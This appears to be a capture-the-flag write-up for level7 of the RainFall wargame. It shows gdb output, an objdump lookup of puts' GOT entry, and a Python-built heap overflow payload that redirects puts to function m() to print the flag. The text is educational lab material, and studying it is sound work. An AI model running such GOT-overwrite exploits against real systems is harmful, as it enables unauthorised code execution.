heap based overflow:

```
    Overflow size = (Address of the target you want to overwrite) − (Start address of your buffer).
```



```
    (gdb) info functions
    All defined functions:

    Non-debugging symbols:
    0x0804836c  _init
    0x080483b0  printf
    0x080483b0  printf@plt
    0x080483c0  fgets
    0x080483c0  fgets@plt
    0x080483d0  time
    0x080483d0  time@plt
    0x080483e0  strcpy
    0x080483e0  strcpy@plt
    0x080483f0  malloc
    0x080483f0  malloc@plt
    0x08048400  puts
    0x08048400  puts@plt
    0x08048410  __gmon_start__
    0x08048410  __gmon_start__@plt
    0x08048420  __libc_start_main
    0x08048420  __libc_start_main@plt
    0x08048430  fopen
    0x08048430  fopen@plt
    0x08048440  _start
    0x08048470  __do_global_dtors_aux
    0x080484d0  frame_dummy
    0x080484f4  m
    0x08048521  main
    0x08048610  __libc_csu_init
    0x08048680  __libc_csu_fini
    0x08048682  __i686.get_pc_thunk.bx
    0x08048690  __do_global_ctors_aux
    0x080486bc  _fini
```

the address of function m() is 0x080484f4 => \xf4\x84\x04\x08


```
    (gdb) run hhhhhhhhbbbbbbbbcccccc j
    Starting program: /home/user/level7/level7 hhhhhhhhbbbbbbbbcccccc j

    Program received signal SIGSEGV, Segmentation fault.
    0xb7eb8f23 in ?? () from /lib/i386-linux-gnu/libc.so.6
```


```
    level7@RainFall:~$ objdump -R ./level7 | grep puts
    08049928 R_386_JUMP_SLOT   puts
```

8 (buffer) + 4 (second[0]) + 4 (second[1]) = 16 bytes => To write exactly into second[1], we need to send 20 bytes:

```
    level7@RainFall:~$ ./level7 "$(python -c 'print("A"*20 + "\x28\x99\x04\x08")')" "$(python -c 'print("\xf4\x84\x04\x08")')"
    5684af5cb4c8679958be4abe6373147ab52d95768e047820bf382e44fa8d8fb9
    - 1746024775
 ```
